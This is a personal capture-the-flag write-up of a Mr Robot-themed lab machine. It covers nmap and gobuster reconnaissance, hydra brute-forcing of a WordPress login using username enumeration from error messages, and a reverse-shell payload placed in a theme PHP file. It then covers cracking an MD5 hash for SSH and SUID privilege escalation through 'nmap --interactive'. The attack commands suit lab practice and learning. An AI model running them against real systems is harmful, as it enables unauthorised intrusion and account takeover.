## Hacking Journal
### Reconnaissance
- I ran a basic Nmap command to get some information on the system:
```shell
nmap -sC -sV -O -p- 10.49.189.226 -oN nmap_results 
```
- It told me port 22 (SSH), port 80 and 443 were open (HTTP/s) and the system was Ubuntu Linux
- After that I ran Gobuster to get a map of the website.
```shell
gobuster dir --url <IP> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
```
- Most notable directories were `/robots.txt` and `/wp-login`.
### Enumeration
- When I visited `/robots.txt` this is what I got:
```txt
User.Agent:*
fsocity.dic
1-out-of-3-key.txt
```
- I didn't understand what it meant at first but turns they are directories. `/1-out-of-3-key.txt` had the first key.
- `/fsocity.dic` had a HUGE list of what seemed to be passwords or that's what I thought at first.
- I used hydra to brute force it in the `/wp-login` page with the username set as `root`, `mrrobot`, `admin`.
- But first I had to get the page from the website.
```shell
curl -o fsocity.dic http://10.49.184.200/fsocity.dic
```
- This will save the output of `/fsocity.dic` into a file called `fsocity.dic`.
- I ran `wc -l fsocity.dic` saw that there were over 7 Million characters. Which seemed odd so I ran.
```shell
sort fsocity.dic | uniq | wc -l
```
- Which showed me 11K characters instead
- So I appended it to a new file
```shell
sort fsocity.dic | uniq >> fsocity_sorted.dic
```
- Then I create a `.txt` file called `username.txt` with the name `root`, `mrrobot`, `admin`.
```shell
hydra -L username.txt -P fsocity_sorted.dic <url or ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.49.189.226%2Fwp-admin%2F&testcookie=1:F=Error" -o success.txt
```
- This was my first time using hydra on the web.
- `http-post-form` followed by `"<field_name>=<data>&<field_name>=<data>&: F=Error"`.
- `F=<Error_Message>` tells hydra that any response with this message means it failed.
- `-o success.txt` to save files that succussed.

- This attempt failed and took a lot of time as I was doing it wrong. I first needed to get the username correct.
- Any time a wrong username is entered in word press it give you an error message saying "Invalid username". This tells us that regardless of the password we wont be logged in unless we correct that.

- After some thinking I tried to user the `fsocity_sorted.dic` in the username field with a new error message:
```shell
hydra -L fsocity_sorted.dic -p test <url or ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.49.189.226%2Fwp-admin%2F&testcookie=1:F=Invalid username" -o success.txt
```
- This worked and I got the name/s `Eliot`, `eliot`, `ElioT`, etc...
- Then I tried it again but this time with the username set to Eliot and password to `fsocity_sorted.dic` and changed the error message
```shell
hydra -l eliot -P fsocity_sorted.dic <url or ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.49.189.226%2Fwp-admin%2F&testcookie=1:F=Invalid password for username eliot` -o success.txt
```
- `F= Invalid password for username <name>` 
- This allowed me to gain access to WordPress
### Remote Code Execution
- Now I had WordPress access I had to figure out a way to get the 2nd flag. What I got from exploring was to try and gain access to the machine.
- After exploring I came across account section where there were 2 account called Admin = Eliot and Subscriber = `<name>` and the subscriber had in their bio `Potential key?` but that search led me to nowhere.
- After exploring further more I found a page called appearance which allowed me to see all the pages created and there were in PHP. For this part I had to ask how would I upload a payload to get access.
- Turns out I could just enter my payload in any of the pages code. 
- I used the one from [Netcat] after adding the payload to the archives page (Page 404 would work too, then you can use any unlisted page).
- [*] **I learned you can use `which <filename>` command to find the file and where it is**

- I couldn't really get it to work so I had to use the browser to explore through the directories.
- I managed to find a password for a user name robot in a file called `password-md5.txt` after reading and pasting the hash to a online translator I got the password to use for SSH.
```shell
ssh robot@<ip>
<password>
```
- After gaining access I got the 2nd key.
### Privilege Escalation
- For the 3rd key I expected that I would need some sort of escalated privilege.
- I tired using `sudo -l` but I didn't have permissions.
- Then I used a command to search for SUID bit `find / -perm -u=s -type f 2>/dev/null`
- Out of all the binaries the one that stood out to me was one for daemon. I later realized that it was the wrong approach.
- Then I saw nmap. Using that information I went to GTFObin and searched for privilege escal through Nmap and found:
```shell
nmap --interactive
```
- But it didn't give me a bash shell where I could change directories and use other command so I searched up and found that I could get that access if I use `/bin/bash -i` in the `nmap --interactive` session.
- After that I went to `/root` and got the 3rd and final key



